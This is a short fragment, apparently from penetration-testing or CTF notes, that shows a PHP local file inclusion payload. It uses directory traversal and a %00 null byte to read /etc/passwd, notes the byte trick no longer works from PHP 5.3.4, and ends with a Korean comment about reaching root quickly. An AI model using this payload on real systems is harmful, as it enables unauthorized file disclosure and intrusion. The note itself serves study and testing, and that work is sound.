```bash
include("languages/../../../../../etc/passwd%00").".php"); which is equivalent to include("languages/../../../../../etc/passwd");
Note: the %00 trick is fixed and not working with PHP 5.3.4 and above.
# 최대한 빨리 루트를 찾는 것이 중요
```
